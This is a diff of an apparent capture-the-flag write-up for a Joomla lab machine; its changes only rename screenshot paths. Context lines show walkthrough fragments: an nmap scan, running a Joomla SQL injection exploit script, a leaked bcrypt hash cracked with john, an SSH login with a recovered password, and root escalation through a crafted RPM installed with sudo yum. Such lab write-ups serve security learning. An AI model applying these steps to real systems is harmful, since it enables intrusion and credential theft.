@@ -8,7 +8,7 @@
 
 **Access the web server, who robbed the bank?**
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Initial Shell
 
@@ -16,7 +16,7 @@
 nmap -A 10.10.116.159
 ```
 
-<figure><img src="../../.gitbook/assets/image (18) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -28,7 +28,7 @@ cd Exploit-Joomla/
 python3 joomblah.py http://10.10.116.159
 ```
 
-<figure><img src="../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
 
 ```
  [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
@@ -42,7 +42,7 @@ python3 joomblah.py http://10.10.116.159
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 ```
 
-<figure><img src="../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 We can  now login to Joomla with the credentials we have found
 
@@ -93,7 +93,7 @@ stty raw -echo;fg
 
 Found a password in the configuration file. The password worked for the user jjameson which was found in the home directory.
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 ssh jjameson@10.10.116.159
@@ -133,7 +133,7 @@ sudo yum localinstall root-1.0-1.noarch.rpm
 sudo -i
 ```
 
-<figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### **Option #2 -** Spawn interactive root shell by loading a custom plugin
 
